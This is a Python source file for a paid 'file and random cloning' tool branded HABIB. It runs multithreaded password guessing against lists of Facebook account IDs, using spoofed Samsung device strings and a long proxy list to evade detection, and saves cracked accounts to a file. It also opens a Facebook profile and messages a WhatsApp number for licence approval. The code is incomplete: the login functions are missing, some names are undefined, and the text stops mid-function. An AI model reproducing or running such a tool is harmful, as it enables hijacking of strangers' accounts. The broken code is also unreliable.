##---------------IMPORT---------------##
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
import requests
import random
import os
from os import path
from pathlib import Path
import os,requests,base64,zlib,pip,urllib,sys,time,random,platform,pip,uuid,subprocess
print(f'\x1b[38;5;196m(\x1b[38;5;48m~\x1b[38;5;196m)\x1b[38;5;48m Loading Installed ')
try:
    import requests,os,json,time,re,random,sys,uuid,string
    from string import *
    from requests import api
    from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python MRM.py')
 
proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001', '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153', '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299', '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294', '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722', '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172', '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999', '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772', '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566', '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678', '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', '184.185.2.12:4145', '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011', '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627', '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678', '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999', '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678', '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080', '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145', '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678', '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801', '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003', '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153', '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863', '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145', '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357', '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469', '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445', '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145', '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080', '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733', '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145', '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153', '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678', '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089', '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145', '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679', '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866', '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080', '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145', '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010', '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049', '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629', '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662', '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145', '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217', '82.147.123.185:10808', '117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080', '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410', '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527', '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010', '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145', '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145', '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145', '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888', '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339', '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678', '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080', '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528', '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678', '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479', '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187', '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999', '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899', '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678', '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430', '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678', '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921', '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145', '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745', '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678', '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547', '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080', '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678', '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145', '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730', '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087', '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005', '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541', '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163', '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207', '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678', '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611', '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145', '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145', '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431', '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678', '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145', '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093', '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864', '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091', '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678', '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145', '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606', '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128', '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80', '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678', '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270', '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145', '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776', '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153', '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145', '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121', '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086', '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145', '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153', '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283', '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129', '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000', '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145', '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089', '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678', '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801', '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629', '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934', '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775', '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145', '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080', '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566', '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128', '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846', '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080', '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080', '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629', '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313', '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678', '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133', '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678', '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599', '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443', '103.207.170.131:5678', '180.210.222.233:1080']


def xox(m):
    for x in m + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)
 
def p(x):
    print(x)

folder_path = '/sdcard/HABIB'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass
 
oks=[]
cps=[]
loop=0
##------------(COLOUR)-------------##   
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'

A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[1;96m'
B = '\x1b[38;5;8m'
H = '\x1b[1;92m' 
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
T = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
##------------(LINE)-------------##  
def linex():
        print(f'{R}--------------------------------------------------')
def clear():
        os.system(f'clear')
        print(logo)

##------------(LOGO)------------##
os.system('xdg-open https://www.facebook.com/profile.php?id=100054925285605')

logo=(f"""{A}

██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░                                    \033[0;41mHABIB\033[0;92m
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} AHSAN HABIB
 {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} Bangladesh Cyber 2.0
 {R}❲{G}😻{R}❳{G} 𝙑𝙀𝙍𝙎𝙄𝙊𝙉   {R}:{G}   1.0
 {R}❲{G}💚{R}❳{G} 𝙎𝙏𝘼𝙏𝙐𝙎    {R}:{G} \033[0;41mFREE\033[0;92m
 {R}❲{G}😻{R}❳{G} 𝙏𝙊𝙊𝙇𝙎     {R}:{G} 𝙍𝙖𝙣𝙙𝙤𝙢+𝙁𝙞𝙡𝙚 𝙘𝙡𝙤𝙣𝙞𝙣𝙜
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#---------------APPROVAL------------##
def approval():
  clear()
  uuid = str(os.geteuid())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Habib1214/Lover/blob/main/Darco.txt').text
    if id in httpCaht:
      print(f"{R}❲{G}1{R}❳{G} SUCCESSFUL APPROVAL")
      msg = str(os.geteuid())
      time.sleep(0.5)
      Main_HABIB()
      pass
    else:
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} HABIB=['+id+']=XD')
      linex()
      print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
      linex()
      print(f"{R}❲{G}1{R}❳{G} assalamualaikum 🥰 7Day=150 TK, 15Day=250 TK, 30Day=400 TK")
      linex()
      input(f'{R}❲{G}1{R}❳{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+8801317377920?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()


def Main_HABIB():
        clear()
        print(f"{R}❲{G}1{R}❳{G} Start File Cloning")
        print(f"{R}❲{G}2{R}❳{G} Start Random Cloning")
        print(f"{R}❲{G}0{R}❳{G} Exit Tools")
        linex()
        opt1 = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
        if opt1 == "1": file()   
        elif opt1 == "2":
            clear();print(f'{R}❲{G}1{R}❳{G} Start Bd Uid Cloning');print(f'{R}❲{G}2{R}❳{G} Start India Uid Cloning');print(f'{R}❲{G}3{R}❳{G} Start Gmail Cloning');linex()
            opt = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
            if opt == '1': bd()
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}❲{G}~{R}❳{G} ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
            if d == '0':Main_MRM()
            else:linex();print(f'{R}❲{G}~{R}❳{G}  ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
 
        elif opt1 == "0":linex();print(f'{R}❲{G}~{R}❳{G} Exit Done Brother ');exit()
        else:linex();print(f'{R}❲{G}~{R}❳{G} ভুল অপশন দিছেন 🙂 ');time.sleep(2);Main_MRM()
 



##----------FILE---------##
 
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}HABIB.txt {R}❲{G}ETC{R}❳{G}");linex()
    file = input(f"{R}❲{G}~{R}❳{G} File Name {R}:{G} ")
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        linex();print(f'{R}❲{G}~{R}❳{G} File location not found ');time.sleep(2);file()
    clear();print(f'{R}❲{G}~{R}❳{G} Method {R}❲{G}T1{R}❳{G} ');print(f'{R}❲{G}~{R}❳{G} Method {R}❲{G}T2{R}❳{G} ');linex()
    methd=input(f"{R}❲{G}~{R}❳{G} Selection {R}:{G} ")
    plist=[]
    clear() 
    try:
        ps_limit = int(input((f"{R}❲{G}~{R}❳{G} Enter Password Limit {R}:{G} ")))
    except:
        ps_limit =1
    clear()
    print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} firstlast {R}|{G} first@@ {R}❲{G}ETC{R}❳{G}');linex()
    for i in range(ps_limit):
        plist.append(input(f"{R}❲{G}~{R}❳{G} Password No {R}❲{G}%s{R}❳{G} {R}:{G} "%(i+1)))
    with tred(max_workers=30) as MRM:
        clear()
        tl = str(len(fo))
        print(f'                {R}❲{G}File Cloning{R}❳{G}');linex()
        print(f'{R}❲{G}~{R}❳{G} Total File Id {R}:{A}',tl)
        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                MRM.submit(api1,ids,names,passlist)
            elif methd =='2':
                MRM.submit(api2,ids,names,passlist)
            else:
                MRM.submit(api1,ids,names,passlist)
            
    print(f'\r{R}--------------------------------------------------')
    print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
    print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HABIB_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    os.system('python Main_MRM.py')
 
##--------------BD_RANDOM------------##
def bd():
                user=[]
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 017 {R}|{G} 019 {R}|{G} 018 {R}|{G} 016');linex()
                code = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
